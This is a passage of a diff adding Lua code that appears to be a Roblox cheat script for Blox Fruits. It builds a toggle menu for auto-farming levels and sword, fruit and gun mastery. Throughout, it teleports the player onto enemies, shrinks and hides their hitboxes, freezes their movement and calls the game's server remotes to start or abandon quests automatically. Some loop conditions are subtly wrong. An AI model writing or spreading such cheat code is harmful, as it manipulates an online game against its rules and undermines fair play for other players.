+                Content = "Social Link Copied",
+                Icon = "bell",
+                Duration = 3
+            });
+        end
+    }}
+});
+LevelFarmSection = Tabs.MainTab:Section({
+    Title = "Level Farm",
+    TextXAlignment = "Left"
+});
+local WeaponList = {"Melee", "Sword", "Fruit"};
+ChooseWeaponDropdown = Tabs.MainTab:Dropdown({
+    Title = "Choose Weapon",
+    Values = WeaponList,
+    Value = _G.Settings.Main["Select Weapon"],
+    Callback = function(option)
+        _G.Settings.Main["Select Weapon"] = option;
+        (getgenv()).SaveSetting();
+    end
+});
+task.spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.Main["Select Weapon"] == "Melee" then
+                for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                    if v.ToolTip == "Melee" then
+                        if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
+                            _G.Settings.Main["Selected Weapon"] = v.Name;
+                        end
+                    end
+                end
+            elseif _G.Settings.Main["Select Weapon"] == "Sword" then
+                for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                    if v.ToolTip == "Sword" then
+                        if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
+                            _G.Settings.Main["Selected Weapon"] = v.Name;
+                        end
+                    end
+                end
+            elseif _G.Settings.Main["Select Weapon"] == "Gun" then
+                for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                    if v.ToolTip == "Gun" then
+                        if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
+                            _G.Settings.Main["Selected Weapon"] = v.Name;
+                        end
+                    end
+                end
+            elseif _G.Settings.Main["Select Weapon"] == "Fruit" then
+                for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                    if v.ToolTip == "Blox Fruit" then
+                        if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
+                            _G.Settings.Main["Selected Weapon"] = v.Name;
+                        end
+                    end
+                end
+            end
+        end);
+    end
+end);
+local LevelFarmMethodList = {"Quest", "No Quest", "Nearest"};
+LevelFarmMethodDropdown = Tabs.MainTab:Dropdown({
+    Title = "Choose Farm Level Method",
+    Values = LevelFarmMethodList,
+    Value = _G.Settings.Main["Farm Level Method"],
+    Callback = function(option)
+        _G.Settings.Main["Farm Level Method"] = option;
+        (getgenv()).SaveSetting();
+    end
+});
+AutoLevelFarmToggle = Tabs.MainTab:Toggle({
+    Title = "Auto Farm Level",
+    Desc = "Automatic Plowing Level",
+    Value = _G.Settings.Main["Auto Farm"],
+    Callback = function(state)
+        _G.Settings.Main["Auto Farm"] = state;
+        StopTween(_G.Settings.Main["Auto Farm"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Main["Farm Level Method"] == "No Quest" and _G.Settings.Main["Auto Farm"] then
+            pcall(function()
+                CheckQuest();
+                if (game:GetService("Workspace")).Enemies:FindFirstChild(Mon) then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health >
+                            0 then
+                            if v.Name == Mon then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    AutoHaki();
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    Attack();
+                                until not _G.Settings.Main["Auto Farm"] or v.Humanoid.Health <= 0 or (not v.Parent) or
+                                    (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+                            end
+                        end
+                    end
+                else
+                    TweenPlayer(CFrameMon);
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Main["Farm Level Method"] == "Nearest" and _G.Settings.Main["Auto Farm"] then
+            pcall(function()
+                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+                        if v.Name then
+                            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
+                                (v:FindFirstChild("HumanoidRootPart")).Position).Magnitude <= 5000 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    Attack();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                until not _G.Settings.Main["Auto Farm"] or (not v.Parent) or v.Humanoid.Health <= 0 or
+                                    (not game.Workspace.Enemies:FindFirstChild(v.Name));
+                            end
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Main["Farm Level Method"] == "Quest" and _G.Settings.Main["Auto Farm"] then
+            pcall(function()
+                CheckQuest();
+                local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle
+                                       .Title.Text;
+                if not string.find(QuestTitle, NameMon) then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+                end
+                if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuest,
+                        LevelQuest);
+                elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+                    if (game:GetService("Workspace")).Enemies:FindFirstChild(Mon) then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and
+                                v.Humanoid.Health > 0 then
+                                if v.Name == Mon then
+                                    if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest
+                                                       .Container.QuestTitle.Title.Text, NameMon) then
+                                        repeat
+                                            (game:GetService("RunService")).Heartbeat:wait();
+                                            EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                            AutoHaki();
+                                            PosMon = v.HumanoidRootPart.CFrame;
+                                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                            v.Humanoid.WalkSpeed = 0;
+                                            v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                            MonFarm = v.Name;
+                                            Attack();
+                                        until not _G.Settings.Main["Auto Farm"] or v.Humanoid.Health <= 0 or
+                                            (not v.Parent) or
+                                            (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible ==
+                                            false;
+                                    end
+                                end
+                            end
+                        end
+                    else
+                        TweenPlayer(CFrameMon);
+                        UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    end
+                end
+            end);
+        end
+    end
+end);
+AutoFastFarmToggle = Tabs.MainTab:Toggle({
+    Title = "Auto Fast Farm",
+    Desc = "Work on Sea 1 Only",
+    Value = _G.Settings.Main["Auto Fast Farm"],
+    Callback = function(state)
+        _G.Settings.Main["Auto Fast Farm"] = state;
+        StopTween(_G.Settings.Main["Auto Fast Farm"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Main["Auto Fast Farm"] and World1 then
+                if game.Players.LocalPlayer.Data.Level.Value >= 10 then
+                    _G.Settings.Main["Auto Farm"] = false;
+                    _G.Settings.Main["Auto Fast Farm"] = true;
+                end
+            end
+        end
+    end);
+end);
+MasteryFarmSection = Tabs.MainTab:Section({
+    Title = "Mastery Farm",
+    TextXAlignment = "Left"
+});
+if World3 then
+    MasteryMethodList = {"Quest", "No Quest", "Nearest", "Cakeprince", "Bones"};
+elseif World2 or World1 then
+    MasteryMethodList = {"Quest", "No Quest", "Nearest"};
+end
+MasteryMethodDropdown = Tabs.MainTab:Dropdown({
+    Title = "Choose Mastery Method",
+    Values = MasteryMethodList,
+    Value = _G.Settings.Main["Mastery Method"],
+    Callback = function(option)
+        _G.Settings.Main["Mastery Method"] = option;
+        (getgenv()).SaveSetting();
+    end
+});
+AutoFruitMasteryToggle = Tabs.MainTab:Toggle({
+    Title = "Auto Fruit Mastery",
+    Value = _G.Settings.Main["Auto Farm Fruit Mastery"],
+    Callback = function(state)
+        _G.Settings.Main["Auto Farm Fruit Mastery"] = state;
+        StopTween(_G.Settings.Main["Auto Farm Fruit Mastery"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoGunMasteryToggle = Tabs.MainTab:Toggle({
+    Title = "Auto Gun Mastery",
+    Value = _G.Settings.Main["Auto Farm Gun Mastery"],
+    Callback = function(state)
+        _G.Settings.Main["Auto Farm Gun Mastery"] = state;
+        StopTween(_G.Settings.Main["Auto Farm Gun Mastery"]);
+        (getgenv()).SaveSetting();
+    end
+});
+local SwordList = {};
+local Inventory = (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("getInventory");
+for i, v in pairs(Inventory) do
+    if v.Type == "Sword" then
+        table.insert(SwordList, v.Name);
+    end
+end
+ChooseSwordDropdown = Tabs.MainTab:Dropdown({
+    Title = "Choose Sword",
+    Values = SwordList,
+    Value = _G.Settings.Main["Selected Mastery Sword"],
+    Callback = function(option)
+        _G.Settings.Main["Selected Mastery Sword"] = option;
+        (getgenv()).SaveSetting();
+    end
+});
+function getInfoSword(SwordName)
+    if game.Players.LocalPlayer.Character:FindFirstChild(SwordName) then
+        return true;
+    elseif game.Players.LocalPlayer.Backpack:FindFirstChild(SwordName) then
+        return true;
+    end
+    return false;
+end
+spawn(function()
+    while wait() do
+        pcall(function()
+            if _G.Settings.Main["Auto Farm Sword Mastery"] then
+                if not getInfoSword(_G.Settings.Main["Selected Mastery Sword"]) then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("LoadItem",
+                        _G.Settings.Main["Selected Mastery Sword"]);
+                end
+            end
+        end);
+    end
+end);
+AutoSwordMasteryToggle = Tabs.MainTab:Toggle({
+    Title = "Auto Sword Mastery",
+    Value = _G.Settings.Main["Auto Farm Sword Mastery"],
+    Callback = function(state)
+        _G.Settings.Main["Auto Farm Sword Mastery"] = state;
+        StopTween(_G.Settings.Main["Auto Farm Sword Mastery"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while task.wait(0.2) do
+        if _G.Settings.Main["Auto Farm Sword Mastery"] and _G.Settings.Main["Mastery Method"] == "Quest" then
+            pcall(function()
+                CheckQuest();
+                if not string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle
+                                       .Title.Text, NameMon) or
+                    (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+                    TweenPlayer(CFrameQuest);
+                    if (CFrameQuest.Position -
+                        (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5 then
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuest,
+                            LevelQuest);
+                    end
+                elseif string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle
+                                       .Title.Text, NameMon) or
+                    (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+                    if game.Workspace.Enemies:FindFirstChild(Mon) then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                                if v.Name == Mon then
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        EquipWeapon(_G.Settings.Main["Selected Mastery Sword"]);
+                                        Attack();
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        AutoHaki();
+                                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                        v.HumanoidRootPart.Transparency = 1;
+                                        v.Humanoid.JumpPower = 0;
+                                        v.Humanoid.WalkSpeed = 0;
+                                        PosMon = v.HumanoidRootPart.CFrame;
+                                        MonFarm = v.Name;
+                                    until not _G.Settings.Main["Auto Farm Sword Mastery"] or (not v.Parent) or
+                                        v.Humanoid.Health == 0 or
+                                        (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false or
+                                        (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name)) or
+                                        not _G.Settings.Main["Mastery Method"] == "Quest";
+                                end
+                            end
+                        end
+                    else
+                        TweenPlayer(CFrameMon);
+                        UnEquipWeapon(_G.Settings.Main["Selected Mastery Sword"]);
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Sword Mastery"] and _G.Settings.Main["Mastery Method"] == "No Quest" then
+            pcall(function()
+                CheckQuest();
+                TweenPlayer(CFrameMon);
+                if game.Workspace.Enemies:FindFirstChild(Mon) then
+                    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+                        if v.Name == Mon and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                EquipWeapon(_G.Settings.Main["Selected Mastery Sword"]);
+                                Attack();
+                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                AutoHaki();
+                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                v.HumanoidRootPart.Transparency = 1;
+                                v.Humanoid.JumpPower = 0;
+                                v.Humanoid.WalkSpeed = 0;
+                                PosMon = v.HumanoidRootPart.CFrame;
+                                MonFarm = v.Name;
+                            until not _G.Settings.Main["Auto Farm Sword Mastery"] or (not v.Parent) or v.Humanoid.Health ==
+                                0 or (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name)) or
+                                not _G.Settings.Main["Mastery Method"] == "No Quest";
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Mastery Sword"]);
+                    TweenPlayer(CFrameMon);
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Sword Mastery"] and _G.Settings.Main["Mastery Method"] == "Bones" then
+            pcall(function()
+                TweenPlayer(QuestBonePos);
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Reborn Skeleton") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Living Zombie") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Demonic Soul") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Posessed Mummy") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or
+                            v.Name == "Posessed Mummy" then
+                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    EquipWeapon(_G.Settings.Main["Selected Mastery Sword"]);
+                                    Attack();
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    AutoHaki();
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                until not _G.Settings.Main["Auto Farm Sword Mastery"] or v.Humanoid.Health <= 0 or
+                                    (not v.Parent) or
+                                    (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name)) or
+                                    not _G.Settings.Main["Mastery Method"] == "Bones";
+                            end
+                        elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Demonic Soul") then
+                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                        end
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Sword Mastery"] and _G.Settings.Main["Mastery Method"] == "Cakeprince" then
+            pcall(function()
+                local PosCake = CFrame.new(-2091.911865234375, 70.00884246826172, -12142.8359375);
+                TweenPlayer(PosCake);
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Cookie Crafter") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Guard") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Baking Staff") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Head Baker") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name ==
+                            "Head Baker" then
+                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    EquipWeapon(_G.Settings.Main["Selected Mastery Sword"]);
+                                    Attack();
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    AutoHaki();
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                until not _G.Settings.Main["Auto Farm Sword Mastery"] or v.Humanoid.Health <= 0 or
+                                    (not v.Parent) or
+                                    (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name)) or
+                                    not _G.Settings.Main["Mastery Method"] == "Cakeprince";
+                            end
+                        elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Baking Staff") then
+                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                        end
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Sword Mastery"] and _G.Settings.Main["Mastery Method"] == "Nearest" then
+            pcall(function()
+                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+                    if v.Name and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                        if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
+                            (v:FindFirstChild("HumanoidRootPart")).Position).Magnitude <= 2000 then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                EquipWeapon(_G.Settings.Main["Selected Mastery Sword"]);
+                                Attack();
+                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                AutoHaki();
+                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                v.HumanoidRootPart.Transparency = 1;
+                                v.Humanoid.JumpPower = 0;
+                                v.Humanoid.WalkSpeed = 0;
+                                PosMon = v.HumanoidRootPart.CFrame;
+                                MonFarm = v.Name;
+                            until not _G.Settings.Main["Auto Farm Sword Mastery"] or (not v.Parent) or v.Humanoid.Health ==
+                                0 or not _G.Settings.Main["Mastery Method"] == "Nearest";
+                        end
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Sword Mastery"] and _G.Settings.Main["Mastery Method"] == "Boss" then
+            if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+                CheckBossQuest();
+                TweenPlayer(CFrameQBoss);
+                if (CFrameQBoss.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                    5 then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuestBoss,
+                        QuestLvBoss);
+                end
+            elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+                pcall(function()
+                    CheckBossQuest();
+                    if (game:GetService("Workspace")).Enemies:FindFirstChild(SelectBoss) then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v.Name == selectBoss and v:FindFirstChild("Humanoid") and
+                                v:FindFirstChild("HumanoidRootPart") then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    EquipWeapon(_G.Settings.Main["Selected Mastery Sword"]);
+                                    Attack();
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    AutoHaki();
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                until not _G.Settings.Main["Auto Farm Sword Mastery"] or
+                                    not _G.Settings.Main["Mastery Method"] == "Boss" or (not v.Parent) or
+                                    v.Humanoid.Health == 0 or game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible ==
+                                    false or (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name));
+                            end
+                        end
+                    end
+                end);
+            end
+        end
+    end
+end);
+spawn(function()
+    while task.wait(0.2) do
+        if _G.Settings.Main["Auto Farm Fruit Mastery"] and _G.Settings.Main["Mastery Method"] == "Quest" then
+            pcall(function()
+                CheckQuest();
+                if not string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle
+                                       .Title.Text, NameMon) or
+                    (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+                    TweenPlayer(CFrameQuest);
+                    if (CFrameQuest.Position -
+                        (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5 then
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuest,
+                            LevelQuest);
+                    end
+                elseif string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle
+                                       .Title.Text, NameMon) or
+                    (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+                    if game.Workspace.Enemies:FindFirstChild(Mon) then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                                if v.Name == Mon then
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        if v.Humanoid.Health <= v.Humanoid.MaxHealth *
+                                            _G.Settings.Setting["Mastery Health"] / 100 then
+                                            EquipWeapon((game:GetService("Players")).LocalPlayer.Data.DevilFruit.Value);
+                                            TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                            CFrame.Angles(math.rad((-90)), 0, 0));
+                                            Skillaimbot = true;
+                                            UseSkill = true;
+                                        else
+                                            UseSkill = false;
+                                            Skillaimbot = false;
+                                            EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                            NormalAttack();
+                                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        end
+                                        AutoHaki();
+                                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                        v.HumanoidRootPart.Transparency = 1;
+                                        v.Humanoid.JumpPower = 0;
+                                        v.Humanoid.WalkSpeed = 0;
+                                        PosMon = v.HumanoidRootPart.CFrame;
+                                        MonFarm = v.Name;
+                                        AimBotSkillPosition = v.HumanoidRootPart.Position;
+                                        Skillaimbot = true;
+                                    until not _G.Settings.Main["Auto Farm Fruit Mastery"] or (not v.Parent) or
+                                        v.Humanoid.Health == 0 or
+                                        (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false or
+                                        (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name)) or
+                                        not _G.Settings.Main["Mastery Method"] == "Quest";
+                                    UseSkill = false;
+                                    Skillaimbot = false;
+                                end
+                            end
+                        end
+                    else
+                        UseSkill = false;
+                        TweenPlayer(CFrameMon);
+                        UnEquipWeapon(SelectWeapon);
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Fruit Mastery"] and _G.Settings.Main["Mastery Method"] == "No Quest" then
+            pcall(function()
+                CheckQuest();
+                TweenPlayer(CFrameMon);
+                if game.Workspace.Enemies:FindFirstChild(Mon) then
+                    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+                        if v.Name == Mon and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] /
+                                    100 then
+                                    EquipWeapon((game:GetService("Players")).LocalPlayer.Data.DevilFruit.Value);
+                                    UseSkill = true;
+                                    Skillaimbot = true;
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                    CFrame.Angles(math.rad((-90)), 0, 0));
+                                else
+                                    UseSkill = false;
+                                    Skillaimbot = false;
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    NormalAttack();
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                end
+                                AutoHaki();
+                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                v.HumanoidRootPart.Transparency = 1;
+                                v.Humanoid.JumpPower = 0;
+                                v.Humanoid.WalkSpeed = 0;
+                                PosMon = v.HumanoidRootPart.CFrame;
+                                MonFarm = v.Name;
+                                AimBotSkillPosition = v.HumanoidRootPart.Position;
+                            until not _G.Settings.Main["Auto Farm Fruit Mastery"] or (not v.Parent) or v.Humanoid.Health ==
+                                0 or (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name)) or
+                                not _G.Settings.Main["Mastery Method"] == "No Quest";
+                            UseSkill = false;
+                            Skillaimbot = false;
+                        end
+                    end
+                else
+                    UseSkill = false;
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrameMon);
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Fruit Mastery"] and _G.Settings.Main["Mastery Method"] == "Bones" then
+            pcall(function()
+                TweenPlayer(QuestBonePos);
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Reborn Skeleton") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Living Zombie") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Demonic Soul") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Posessed Mummy") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or
+                            v.Name == "Posessed Mummy" then
+                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] /
+                                        100 then
+                                        EquipWeapon((game:GetService("Players")).LocalPlayer.Data.DevilFruit.Value);
+                                        UseSkill = true;
+                                        Skillaimbot = true;
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                        CFrame.Angles(math.rad((-90)), 0, 0));
+                                    else
+                                        UseSkill = false;
+                                        Skillaimbot = false;
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        NormalAttack();
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    end
+                                    AutoHaki();
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    AimBotSkillPosition = v.HumanoidRootPart.Position;
+                                until not _G.Settings.Main["Auto Farm Fruit Mastery"] or v.Humanoid.Health <= 0 or
+                                    (not v.Parent) or
+                                    (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name)) or
+                                    not _G.Settings.Main["Mastery Method"] == "Bones";
+                                UseSkill = false;
+                                Skillaimbot = false;
+                            end
+                        elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Demonic Soul") then
+                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                        end
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Fruit Mastery"] and _G.Settings.Main["Mastery Method"] == "Cakeprince" then
+            pcall(function()
+                local PosCake = CFrame.new(-2091.911865234375, 70.00884246826172, -12142.8359375);
+                TweenPlayer(PosCake);
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Cookie Crafter") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Guard") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Baking Staff") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Head Baker") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name ==
+                            "Head Baker" then
+                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] /
+                                        100 then
